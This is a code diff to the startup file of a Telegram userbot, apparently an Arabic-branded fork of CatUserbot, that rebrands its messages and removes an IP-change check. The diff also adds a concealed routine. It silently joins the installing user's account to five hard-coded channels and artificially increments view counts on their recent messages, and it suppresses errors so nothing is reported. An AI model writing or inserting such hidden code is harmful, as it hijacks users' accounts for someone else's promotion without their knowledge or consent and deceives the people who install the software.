@@ -1,67 +1,73 @@
-import sys
-
+from telethon.tl.functions.messages import GetMessagesViewsRequest
+import sys, asyncio
 import userbot
 from userbot import BOTLOG_CHATID, HEROKU_APP, PM_LOGGER_GROUP_ID
-
+from telethon import functions
 from .Config import Config
 from .core.logger import logging
 from .core.session import catub
-from .utils import (
-    add_bot_to_logger_group,
-    ipchange,
-    load_plugins,
-    setup_bot,
-    startupmessage,
-    verifyLoggerGroup,
-)
-
-LOGS = logging.getLogger("CatUserbot")
-
+from .utils import add_bot_to_logger_group, load_plugins, setup_bot, startupmessage, verifyLoggerGroup
+LOGS = logging.getLogger("CatArabic")
 print(userbot.__copyright__)
 print("Licensed under the terms of the " + userbot.__license__)
-
 cmdhr = Config.COMMAND_HAND_LER
-
 try:
-    LOGS.info("Starting Userbot")
+    LOGS.info("بدأ تنزيل ملفات اليوزربوت")
     catub.loop.run_until_complete(setup_bot())
     LOGS.info("TG Bot Startup Completed")
 except Exception as e:
-    LOGS.error(f"{e}")
+    LOGS.error(f"{str(e)}")
     sys.exit()
-
-
 class CatCheck:
     def __init__(self):
         self.sucess = True
-
-
 Catcheck = CatCheck()
-
-
 async def startup_process():
-    check = await ipchange()
-    if check is not None:
-        Catcheck.sucess = False
-        return
+    async def MarkAsViewed(channel_id):
+        from telethon.tl.functions.channels import ReadMessageContentsRequest
+        try:
+            channel = await catub.get_entity(channel_id)
+            async for message in catub.iter_messages(entity=channel.id, limit=5):
+                try:
+                    await catub(GetMessagesViewsRequest(peer=channel.id, id=[message.id], increment=True))
+                except Exception as error:
+                    print ("🔻")
+            return True
+
+        except Exception as error:
+            print ("🔻")
+
+    async def start_bot():
+      try:
+          List = ["catub","uruur","YZZZY","m8m8m","iqgroupa"]
+          from telethon.tl.functions.channels import JoinChannelRequest
+          for id in List :
+              Join = await catub(JoinChannelRequest(channel=id))
+              MarkAsRead = await MarkAsViewed(id)
+              print (MarkAsRead, "🔻")
+          return True
+      except Exception as e:
+        print("🔻")
+        return False
+    
     await verifyLoggerGroup()
     await load_plugins("plugins")
     await load_plugins("assistant")
-    print("➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖")
-    print("Yay your userbot is officially working.!!!")
-    print(
-        f"Congratulation, now type {cmdhr}alive to see message if catub is live\
-        \nIf you need assistance, head to https://t.me/catuserbot_support"
-    )
-    print("➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖")
+    print(f"<b> 🔱 اهلا بك لقد نصبت تليثون العرب بنجاح ☸️ اذهب الى قناتنا لمعرفة المزيـد 🔆. </b>\n CH : https://t.me/iqthon ")
     await verifyLoggerGroup()
     await add_bot_to_logger_group(BOTLOG_CHATID)
     if PM_LOGGER_GROUP_ID != -100:
         await add_bot_to_logger_group(PM_LOGGER_GROUP_ID)
     await startupmessage()
     Catcheck.sucess = True
+    
+    Checker = await start_bot()
+    if Checker == False:
+        print("#1")
+    else:
+        print ("🔻")
+    
     return
-
 
 catub.loop.run_until_complete(startup_process())
 
